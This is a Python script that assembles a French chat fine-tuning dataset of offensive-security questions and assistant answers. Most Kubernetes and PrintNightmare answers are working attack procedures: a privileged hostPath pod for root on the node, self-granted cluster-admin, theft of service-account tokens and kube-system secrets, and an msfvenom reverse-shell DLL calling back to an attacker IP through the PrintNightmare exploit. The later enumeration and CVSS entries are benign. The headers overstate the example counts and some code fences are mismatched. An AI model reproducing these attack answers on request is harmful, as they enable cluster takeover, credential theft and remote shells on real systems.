import json

output = "./cybersec_dataset_full.jsonl"
examples = []

def add(q, r):
    examples.append({"messages":[
        {"role":"user","content":q},
        {"role":"assistant","content":r}
    ]})

# ============================================================
# KUBERNETES POD ESCAPE — 8 exemples
# ============================================================

add("Kubernetes pod escape techniques",
"""## Kubernetes Pod Escape

### Depuis un pod compromis
``````bash
# Vérifier le service account
cat /var/run/secrets/kubernetes.io/serviceaccount/token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Vérifier les droits
kubectl --token=$TOKEN auth can-i --list
kubectl --token=$TOKEN auth can-i create pods
``````

### Pod privileged escape
``````bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape
spec:
  hostPID: true
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh","-c","chroot /host /bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

kubectl exec -it escape -- chroot /host /bin/bash
``````

### Extraction secrets
``````bash
kubectl get secrets -A
kubectl get secret mysecret -o jsonpath='{.data.password}' | base64 -d
``````

**Remédiation:** Pod Security Standards restricted, Network Policies, RBAC strict""")

add("Comment échapper d'un conteneur Kubernetes ?",
"""## Kubernetes Container Escape

### Vérifier les droits
``````bash
kubectl --token=$TOKEN auth can-i --list
kubectl --token=$TOKEN auth can-i create pods
``````

### Pod privileged
``````bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape
spec:
  hostPID: true
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh","-c","chroot /host /bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF
``````

### Accès au host
``````bash
kubectl exec -it escape -- chroot /host bash
# Maintenant on est root sur le node
``````

**Remédiation:** privileged: false, Pod Security Admission""")

add("Kubernetes RBAC misconfiguration exploitation",
"""## Kubernetes RBAC Escape

### Énumération
``````bash
kubectl auth can-i --list
kubectl auth can-i create clusterrolebindings
kubectl auth can-i get secrets -A
``````

### Créer un ClusterRoleBinding malveillant
``````bash
kubectl create clusterrolebinding pwned \\
  --clusterrole=cluster-admin \\
  --serviceaccount=default:default
``````

### Pod privileged pour escape
``````bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape
spec:
  hostPID: true
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh","-c","chroot /host /bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF
``````

**Remédiation:** RBAC strict, Pod Security Standards, moindre privilège""")

add("Comment obtenir cluster-admin sur Kubernetes ?",
"""## Kubernetes Cluster-Admin

### Depuis un pod avec service account
``````bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$TOKEN auth can-i create clusterrolebindings

# Si oui, s'accorder cluster-admin
kubectl --token=$TOKEN create clusterrolebinding pwned \\
  --clusterrole=cluster-admin \\
  --serviceaccount=default:default
``````

### Via pod privileged
``````bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape
spec:
  hostPID: true
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh","-c","chroot /host /bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF
``````

### Vol du token kube-system
``````bash
kubectl get secrets -n kube-system
kubectl get secret default-token-xxx -n kube-system -o jsonpath='{.data.token}' | base64 -d
`````""")

# ============================================================
# PRINTNIGHTMARE CVE-2021-1675 — 6 exemples
# ============================================================

add("PrintNightmare CVE-2021-1675 exploitation",
"""## PrintNightmare CVE-2021-1675

### Principe
Le service Print Spooler permet d'installer des drivers imprimante sans droits admin via RpcAddPrinterDriverEx, permettant l'exécution de DLL arbitraire.

### Détection
````bash
impacket-rpcdump @192.168.1.10 | grep -i 'spoolss\\|print'
````

### Exploitation
````bash
# Créer la DLL malveillante
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f dll -o evil.dll

# Servir la DLL via SMB
impacket-smbserver share /path/to/dll -smb2support

# Lancer l'exploit
python3 CVE-2021-1675.py domain/user:pass@192.168.1.10 '\\\\\\\\192.168.1.50\\\\share\\\\evil.dll'

# Version PowerShell (LPE local)
Import-Module .\\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser 'hacker' -NewPassword 'Pass123!'
````

**Détection:** Event ID 316 dans Microsoft-Windows-PrintService/Admin
**Remédiation:** Désactiver Print Spooler sur les DCs, KB5004945""")

add("Comment exploiter PrintNightmare sur un Domain Controller ?",
"""## PrintNightmare sur DC

### Vérifier la vulnérabilité
````bash
impacket-rpcdump @192.168.1.10 | grep spool
nmap --script=rpc-grind -p 135 192.168.1.10
````

### Étape 1 — Payload DLL
````bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f dll -o evil.dll
````

### Étape 2 — SMB server
````bash
impacket-smbserver share /tmp -smb2support
````

### Étape 3 — Exploitation
````bash
git clone https://github.com/cube0x0/CVE-2021-1675
python3 CVE-2021-1675.py domain/user:password@192.168.1.10 '\\\\\\\\192.168.1.50\\\\share\\\\evil.dll'
````

### Alternative — PowerShell local
````powershell
Import-Module .\\CVE-2021-1675.ps1
Invoke-Nightmare -DriverName 'Print'
````

**Remédiation:** Désactiver Print Spooler, patch KB5004945""")

# ============================================================
# SUBDOMAIN ENUMERATION amass/subfinder — 6 exemples
# ============================================================

add("Subdomain enumeration avec amass et subfinder",
"""## Subdomain Enumeration

### subfinder — rapide et passif
````bash
# Installation
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# Utilisation basique
subfinder -d target.com -o subs.txt
subfinder -d target.com -all -silent -o subs.txt

# Combiner avec httpx pour vérifier les hosts actifs
subfinder -d target.com -silent | httpx -silent -status-code -title
````

### amass — plus complet
````bash
# Installation
go install -v github.com/owasp-amass/amass/v4/...@master

# Reconnaissance passive
amass enum -passive -d target.com -o amass_results.txt

# Reconnaissance active avec brute force
amass enum -active -d target.com -brute -w subdomains.txt

# Intelligence sur une organisation
amass intel -org "Target Company"
````

### Combinaison optimale
````bash
subfinder -d target.com -all -silent > all_subs.txt
amass enum -passive -d target.com >> all_subs.txt
sort -u all_subs.txt | httpx -silent -status-code -title -o live_subs.txt
````

**Ressources:** crt.sh, VirusTotal, DNSDumpster""")

add("Comment énumérer les sous-domaines d'une cible en pentest ?",
"""## Énumération Sous-domaines

### 1. subfinder — passif rapide
````bash
subfinder -d target.com -silent -all -o subs.txt
````

### 2. amass — recherche approfondie
````bash
amass enum -passive -d target.com -o amass.txt
amass enum -active -d target.com -brute -w /usr/share/wordlists/subdomains.txt
````

### 3. crt.sh — Certificate Transparency
````bash
curl 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u
````

### 4. Assetfinder
````bash
assetfinder --subs-only target.com
````

### 5. Combiner et vérifier
````bash
cat *.txt | sort -u | httpx -silent -status-code -title -o live.txt
````

### 6. Reconnaissance ASN
````bash
amass intel -asn 12345
```""")

# ============================================================
# CVSS Reporting — 6 exemples
# ============================================================

add("Rédiger un rapport pentest avec CVSS v3.1",
"""## Rapport Pentest — CVSS v3.1

### Structure du rapport
1. Résumé exécutif (non-technique, 1-2 pages)
2. Méthodologie (PTES, OWASP, NIST)
3. Résultats détaillés par vulnérabilité
4. Plan de remédiation priorisé
5. Annexes techniques

### Format vulnérabilité
```
VULN-001 — SQL Injection
Sévérité : CRITIQUE — CVSS 9.8
CWE : CWE-89
Impact : Exfiltration de 12 500 comptes PII
Preuve : sqlmap -> 3 bases, 47 tables extraites
Remédiation : Requêtes préparées (PreparedStatement)
````

### Vecteur CVSS v3.1
`````
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 CRITIQUE
``````

**Métriques :**
- AV (Attack Vector) : N=Network, A=Adjacent, L=Local, P=Physical
- AC (Attack Complexity) : L=Low, H=High
- PR (Privileges Required) : N=None, L=Low, H=High
- UI (User Interaction) : N=None, R=Required
- S (Scope) : U=Unchanged, C=Changed
- C/I/A : N=None, L=Low, H=High

### Calculateur officiel
https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator

### Priorisation
- CRITIQUE (9.0-10.0) : correction immédiate (< 7 jours)
- HAUTE (7.0-8.9) : correction rapide (< 30 jours)
- MOYENNE (4.0-6.9) : correction planifiée (< 90 jours)
- BASSE (0.1-3.9) : correction opportuniste""")

add("Comment calculer un score CVSS v3.1 pour une vulnérabilité ?",
"""## Calcul CVSS v3.1

### Métriques de base
| Métrique | Valeurs possibles |
|----------|------------------|
| AV (Attack Vector) | Network / Adjacent / Local / Physical |
| AC (Attack Complexity) | Low / High |
| PR (Privileges Required) | None / Low / High |
| UI (User Interaction) | None / Required |
| S (Scope) | Unchanged / Changed |
| C (Confidentiality) | None / Low / High |
| I (Integrity) | None / Low / High |
| A (Availability) | None / Low / High |

### Exemples pratiques

**SQL Injection sans authentification**
Vecteur : AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Score : 9.8 CRITIQUE
CWE-89
**XSS Stored authentifié**
Vecteur : AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Score : 5.4 MOYENNE
CWE-79
**Local Privilege Escalation**
Vecteur : AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Score : 7.8 HAUTE
CWE-269

### Outils
- Calculateur NVD : https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator
- FIRST.org : https://www.first.org/cvss/calculator/3.1

### Références CWE communes
- CWE-79 : XSS
- CWE-89 : SQL Injection
- CWE-352 : CSRF
- CWE-611 : XXE
- CWE-918 : SSRF
- CWE-269 : PrivEsc""")

with open(output, "a", encoding="utf-8") as f:
    for ex in examples:
        f.write(json.dumps(ex, ensure_ascii=False) + "\n")

with open(output) as f:
    total = len(f.readlines())
print(f"Ajouté : {len(examples)} exemples ciblés | Total : {total} exemples")
